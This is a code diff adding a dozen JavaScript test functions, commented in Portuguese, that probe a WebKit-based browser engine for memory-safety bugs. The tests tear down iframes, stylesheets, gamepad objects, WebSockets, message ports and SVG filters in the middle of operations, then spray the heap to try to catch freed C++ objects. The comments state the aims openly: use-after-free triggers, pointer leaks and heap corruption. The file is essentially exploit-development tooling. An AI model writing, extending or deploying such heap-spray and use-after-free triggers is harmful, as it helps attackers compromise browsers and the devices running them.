+        // ==========================================
+        function runTest204() {
+            clearOutput();
+            logOutput("[Teste 204] A stressar a marcação de ponteiros do Garbage Collector...");
+            
+            try {
+                const container = document.getElementById('test-containers');
+                let map = new WeakMap();
+                let chaves = [];
+                
+                // Cria milhares de nós DOM para encher o WeakMap
+                for(let i = 0; i < 2000; i++) {
+                    let div = document.createElement('div');
+                    container.appendChild(div);
+                    map.set(div, new Array(100).fill(1.1)); // Associa memória pesada à chave fraca
+                    chaves.push(div);
+                }
+                
+                // Quebra as referências fortes (remove do DOM e do Array)
+                container.innerHTML = '';
+                chaves = null;
+                
+                // Força alocação massiva temporária para obrigar o GC a iniciar o ciclo de varredura
+                let pressaoGC = new Array(5000).fill(new Uint8Array(1024 * 1024));
+                pressaoGC = null; 
+                
+                window.spray204 = elegantFloatSpray(1);
+                
+                logOutput("Ciclo GC acionado artificialmente e memória pulverizada. A aguardar estabilidade.");
+                
+            } catch(e) {
+                logOutput("Alocador JS geriu a pressão do GC sem problemas: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 205: Font-Face Synchronous Decode Panic
+        // ==========================================
+        function runTest205() {
+            clearOutput();
+            logOutput("[Teste 205] A forçar a descodificação nativa de fontes a colapsar...");
+            
+            try {
+                const container = document.getElementById('test-containers');
+                let style = document.createElement('style');
+                document.head.appendChild(style);
+                let sheet = style.sheet;
+                
+                // Injeta uma fonte com um payload Base64 falso/corrompido
+                let fakeFont = "data:font/woff;base64," + "A".repeat(10000);
+                sheet.insertRule(`@font-face { font-family: 'CrashFont'; src: url('${fakeFont}'); }`, 0);
+                
+                let alvo = document.createElement('div');
+                alvo.style.fontFamily = 'CrashFont';
+                alvo.innerText = "Calcula-me";
+                container.appendChild(alvo);
+
+                // O C++ vai pausar para tentar processar a fonte corrompida quando pedirmos o tamanho
+                let armadilha = {
+                    valueOf: function() {
+                        // Antes da matemática do layout terminar, destruímos a regra da fonte
+                        sheet.deleteRule(0);
+                        window.spray205 = elegantFloatSpray(2);
+                        return 0;
+                    }
+                };
+
+                // Truque sujo: forçamos o getter do offsetHeight, mas passando o valor por uma armadilha JS
+                try {
+                    alvo.style.width = armadilha + "px";
+                    let forcaReflow = alvo.offsetHeight; 
+                } catch(ignora) {}
+
+                logOutput("Layout Síncrono calculado. O Motor de Fontes rejeitou o lixo sem corromper ponteiros.");
+                setTimeout(() => { if(style.parentNode) style.remove(); }, 100);
+            } catch(e) {
+                logOutput("Proteção do CSSOM ativada: " + e);
+            }
+        }
+// ==========================================
+        // Teste 206: getGamepads Stolen Reference UAF
+        // ==========================================
+        function runTest206() {
+            clearOutput();
+            logOutput("[Teste 206] A roubar a função de polling nativa do iframe...");
+            
+            try {
+                const container = document.getElementById('test-containers');
+                let iframe = document.createElement('iframe');
+                container.appendChild(iframe);
+
+                // Roubamos a referência nativa da função C++ associada a esta janela específica
+                let getPadsRoubado = iframe.contentWindow.navigator.getGamepads.bind(iframe.contentWindow.navigator);
+
+                // Destruímos o iframe (aciona DOMWindow::disconnectFrame no motor)
+                iframe.remove();
+                iframe = null;
+                
+                // Sujamos o Heap antes de tentar executar a função
+                window.spray206 = elegantFloatSpray(2);
+
+                logOutput("Contexto aniquilado. A invocar C++ no vazio...");
+                
+                // O WebKit tem de validar se a janela ainda existe. Se falhar, tentará ler IPC para um documento morto.
+                let resultado = getPadsRoubado();
+                
+                logOutput("Função roubada retornou de forma segura: " + (resultado ? resultado.length : "null"));
+            } catch(e) {
+                logOutput("Motor protegeu o contexto desanexado: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 207: Live Gamepad Object Leak & Spray
+        // ==========================================
+        function runTest207() {
+            clearOutput();
+            logOutput("[Teste 207] A tentar vazar ponteiros C++ do objeto Gamepad...");
+            
+            try {
+                const container = document.getElementById('test-containers');
+                let iframe = document.createElement('iframe');
+                container.appendChild(iframe);
+
+                let pads = iframe.contentWindow.navigator.getGamepads();
+                let alvoGamepad = null;
+
+                // Tenta encontrar um comando ligado
+                for (let i = 0; i < pads.length; i++) {
+                    if (pads[i]) {
+                        alvoGamepad = pads[i];
+                        break;
+                    }
+                }
+
+                if (!alvoGamepad) {
+                    logOutput("Nenhum Gamepad detetado. Pressione um botão no comando e tente novamente.");
+                    return;
+                }
+
+                logOutput("Gamepad encontrado. A isolar objeto e a aniquilar origem...");
+
+                // Arrancamos a janela debaixo do objeto vivo
+                iframe.remove();
+                iframe = null;
+
+                // Spray massivo
+                window.spray207 = elegantFloatSpray(3);
+
+                // Forçamos a leitura C++ da propriedade 'buttons'.
+                // Se o objeto for um ponteiro puro e a memória foi libertada com o iframe, isto fará Crash.
+                let btnCount = alvoGamepad.buttons.length;
+                let eixoZ = alvoGamepad.axes[0];
+
+                logOutput("Objeto Gamepad sobreviveu ao desmantelamento da janela. Leitura: " + btnCount + " botões.");
+
+            } catch(e) {
+                logOutput("Proteção de memória intercetou a leitura órfã: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 208: Hardware Interrupt (gamepadconnected) Panic
+        // ==========================================
+        function runTest208() {
+            clearOutput();
+            logOutput("[Teste 208] A aguardar interrupção de hardware (PRESSIONE UM BOTÃO)...");
+            
+            try {
+                window.addEventListener("gamepadconnected", function handler(e) {
+                    try {
+                        // O C++ recebeu o sinal do Kernel FreeBSD de que um gamepad está ativo
+                        logOutput("Sinal IPC do Comando Recebido! A corromper estrutura...");
+                        
+                        // Aniquilamos todo o conteúdo da página a meio do evento assíncrono
+                        document.body.innerHTML = '';
+                        
+                        // Pulverizamos o heap para intercetar o objeto do evento no C++
+                        window.spray208 = elegantFloatSpray(4);
+                        
+                        window.removeEventListener("gamepadconnected", handler);
+                        
+                        // Recria a UI mínima para não ficarmos com ecrã branco permanente
+                        setTimeout(() => {
+                            document.body.innerHTML = '<div style="font-family: monospace;">[Teste 208] Evento de hardware concluído. O motor estabilizou.</div>';
+                        }, 500);
+                        
+                    } catch(err) {}
+                });
+            } catch(e) {
+                logOutput("Erro ao registar escuta de hardware: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 209: Synthetic GamepadEvent Routing Collapse
+        // ==========================================
+        function runTest209() {
+            clearOutput();
+            logOutput("[Teste 209] A despachar evento de Gamepad sintético em árvore colapsada...");
+            
+            try {
+                const container = document.getElementById('test-containers');
+                let div = document.createElement('div');
+                container.appendChild(div);
+
+                div.addEventListener('gamepadconnected', function() {
+                    logOutput("Evento sintético não deveria borbulhar aqui de forma segura!");
+                });
+
+                // Cria um evento falso nativamente
+                let ev;
+                try {
+                    ev = new GamepadEvent('gamepadconnected', {
+                        bubbles: true,
+                        gamepad: { id: "Fake_Gamepad", axes: [], buttons: [] }
+                    });
+                } catch (e) {
+                    // Fallback para WebKit antigo se o construtor falhar
+                    ev = document.createEvent('Event');
+                    ev.initEvent('gamepadconnected', true, false);
+                }
+
+                // Armadilha C++: a meio do despacho, destrói o alvo
+                let target = document.createElement('span');
+                div.appendChild(target);
+                
+                target.addEventListener('gamepadconnected', function() {
+                    // Destrói a raiz do despacho a meio da propagação
+                    div.remove();
+                    window.spray209 = elegantFloatSpray(2);
+                });
+
+                target.dispatchEvent(ev);
+                
+                logOutput("Roteamento C++ processou o evento e a destruição do nó com segurança.");
+            } catch(e) {
+                logOutput("Motor bloqueou a anomalia no evento de Gamepad: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 210: 60FPS Polling Burst + Mathematical Spray
+        // ==========================================
+        function runTest210() {
+            clearOutput();
+            logOutput("[Teste 210] A iniciar 30 frames de pressão de Polling IPC + Spray...");
+            
+            let frames = 0;
+            const LIMIT = 30; // Controlado para não causar DoS, mas suficiente para causar colisão no IPC
+            window.spray210 = [];
+
+            function loop() {
+                try {
+                    // Lê o hardware nativamente a cada frame (gera mensagem IPC interna)
+                    let pads = navigator.getGamepads();
+                    
+                    // Aloca lixo matemático e guarda na memória global para fragmentar o Heap nativamente
+                    window.spray210.push(elegantFloatSpray(1));
+                    
+                    frames++;
+                    
+                    if (frames < LIMIT) {
+                        requestAnimationFrame(loop);
+                    } else {
+                        logOutput("Pressão de frames terminada. Se a consola não engasgou, o Garbage Collector limpou o IPC a tempo.");
+                        // Liberta a RAM passados uns segundos para manter o ambiente limpo
+                        setTimeout(() => { window.spray210 = []; }, 1000);
+                    }
+                } catch(e) {
+                    logOutput("Erro no FrameLoop: " + e);
+                }
+            }
+            
+            requestAnimationFrame(loop);
+        }
+ // ==========================================
+        // Teste 211: WebSocket Handshake Abort UAF
+        // ==========================================
+        function runTest211() {
+            clearOutput();
+            logOutput("[Teste 211] A iniciar Handshake WebSocket...");
+            
+            try {
+                // Tenta ligar a um porto local para forçar a máquina de estados C++ a arrancar
+                let ws = new WebSocket("ws://127.0.0.1:54321");
+                
+                // Exatamente no próximo micro-tick (enquanto o C++ está a resolver a ligação)
+                setTimeout(() => {
+                    // Abortamos a ligação nativa
+                    ws.close();
+                    ws = null;
+                    
+                    // Pulverizamos a memória para tentar apanhar a estrutura de rede morta
+                    window.spray211 = elegantFloatSpray(3);
+                    
+                    logOutput("WebSocket abortado a meio do Handshake e memória pulverizada.");
+                }, 0);
+                
+            } catch(e) {
+                logOutput("Motor protegeu o descritor de rede: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 212: CSS RenderGrid Auto-Fill Panic
+        // ==========================================
+        function runTest212() {
+            clearOutput();
+            logOutput("[Teste 212] A forçar cálculo massivo no RenderGrid C++...");
+            
+            try {
+                const container = document.getElementById('test-containers');
+                let grid = document.createElement('div');
+                // Força o C++ a calcular dinamicamente o número de colunas
+                grid.style.display = 'grid';
+                grid.style.gridTemplateColumns = 'repeat(auto-fill, minmax(10px, 1fr))';
+                grid.style.width = '1000px';
+                
+                // Injeta 500 elementos para forçar a árvore de renderização
+                for(let i = 0; i < 500; i++) {
+                    let item = document.createElement('div');
+                    grid.appendChild(item);
+                }
+                
+                container.appendChild(grid);
+
+                // Força o C++ a calcular o layout de forma síncrona
+                let calculaLayout = grid.offsetHeight;
+
+                // Destrói a grelha instantaneamente após o cálculo
+                grid.remove();
+                grid = null;
+                
+                // Spray matemático focado nas estruturas do RenderTree
+                window.spray212 = elegantFloatSpray(2);
+                
+                logOutput("Layout Grid calculado, contentor destruído e memória pulverizada.");
+                
+            } catch(e) {
+                logOutput("Motor de layout WebCore sobreviveu ao colapso do Grid: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 213: MessagePort Transfer & Teardown Race
+        // ==========================================
+        function runTest213() {
+            clearOutput();
+            logOutput("[Teste 213] A transferir portas IPC para contexto condenado...");
+            
+            try {
+                const container = document.getElementById('test-containers');
+                let iframe = document.createElement('iframe');
+                container.appendChild(iframe);
+
+                let mc = new MessageChannel();
+                
+                // A porta 2 é fisicamente desanexada deste documento e enviada para o iframe
+                iframe.contentWindow.postMessage("carga", "*", [mc.port2]);
+
+                // No mesmo milissegundo, antes da Fila IPC nativa entregar a porta, aniquilamos o destino
+                iframe.remove();
+                iframe = null;
+
+                // Pulverizamos o espaço livre para corromper a porta em trânsito
+                window.spray213 = elegantFloatSpray(2);
+
+                logOutput("Transferência IPC iniciada e janela destino assassinada com sucesso.");
+
+            } catch(e) {
+                logOutput("Gestor IPC lidou com a porta órfã em segurança: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 214: SVG GPU Filter Detachment
+        // ==========================================
+        function runTest214() {
+            clearOutput();
+            logOutput("[Teste 214] A acionar filtros GPU e a corromper a árvore SVG...");
+            
+            try {
+                const container = document.getElementById('test-containers');
+                
+                // Injeta um filtro SVG pesado
+                container.innerHTML = `
+                    <svg id="svgAlvo" width="0" height="0">
+                        <filter id="blur">
+                            <feGaussianBlur stdDeviation="15" />
+                        </filter>
+                    </svg>
+                    <div id="boxAlvo" style="width: 200px; height: 200px; background: red; filter: url(#blur);"></div>
+                `;
+                
+                let box = document.getElementById('boxAlvo');
+                let svg = document.getElementById('svgAlvo');
+
+                // Força o pipeline gráfico a reconhecer o filtro
+                let calculaGPU = box.offsetHeight;
+
+                // Removemos abruptamente o SVG que contém a definição do filtro
+                svg.remove();
+                svg = null;
+
+                // Pulverizamos a memória para corromper os ponteiros de textura da GPU
+                window.spray214 = elegantFloatSpray(2);
+
+                logOutput("Filtro SVG removido a meio da renderização e VRAM/RAM pulverizada.");
+
+            } catch(e) {
+                logOutput("Pipeline de renderização protegido contra falta de recursos: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 215: CSSOM Vector Reallocation Smash
+        // ==========================================
+        function runTest215() {
+            clearOutput();
+            logOutput("[Teste 215] A forçar realocação do vetor de estilos C++...");
+            
+            try {
+                let style = document.createElement('style');
+                document.head.appendChild(style);
+                let sheet = style.sheet;
+
+                // Insere dezenas de regras rapidamente para forçar o vetor dinâmico do C++ a crescer
+                // e realocar memória para um bloco maior
+                for(let i = 0; i < 200; i++) {
+                    sheet.insertRule(`.classe_${i} { color: red; }`, i);
+                }
+
+                logOutput("Vetor CSSOM expandido. A iniciar aniquilação e Spray...");
+
+                // Apaga todas as regras violentamente, marcando o bloco de memória como livre
+                while(sheet.cssRules.length > 0) {
+                    sheet.deleteRule(0);
+                }
+
+                // Pulverizamos o espaço onde o vetor estava armazenado
+                window.spray215 = elegantFloatSpray(3);
+
+                // Tentamos inserir uma nova regra. Se o C++ usar um ponteiro desatualizado (UAF), fará Crash.
+                sheet.insertRule(`.gatilho { color: blue; }`, 0);
+
+                logOutput("Estouro de vetor CSSOM concluído. O motor estabilizou.");
+                setTimeout(() => { if(style.parentNode) style.remove(); }, 100);
+
+            } catch(e) {
+                logOutput("Gestor de CSSOM imune ao ataque de realocação: " + e);
             }
         }
     </script>
